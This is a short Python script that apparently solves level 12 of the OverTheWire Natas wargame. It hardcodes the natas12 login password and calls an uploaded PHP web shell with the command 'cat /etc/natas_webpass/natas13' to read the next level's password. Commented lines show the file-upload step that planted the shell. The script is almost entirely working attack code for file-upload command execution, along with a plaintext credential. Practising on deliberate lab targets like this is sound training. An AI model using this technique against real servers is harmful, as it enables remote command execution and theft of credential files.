#Import Library
import requests
import re
import base64

#Setting variables needed
username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = f'http://{username}.natas.labs.overthewire.org/upload/6r569eriso.php?e=cat /etc/natas_webpass/natas13'
#Set the payload up
#payloads={"MAX_FILE_SIZE":"1000","filename":"a.php", "submit":"Upload File"}

#Set up 'files' to upload a PHP file
#files = {"uploadedfile":open("/Users/KBJoon/Desktop/a.php",'rb')}

#Connect to natas
session = requests.Session()
response = session.request('POST', url, auth=(username,password))

#Filtering to get a password
result = response.text
#result = re.findall('The password for natas12 is (.*)<br>', response.text)[0]

print(result)
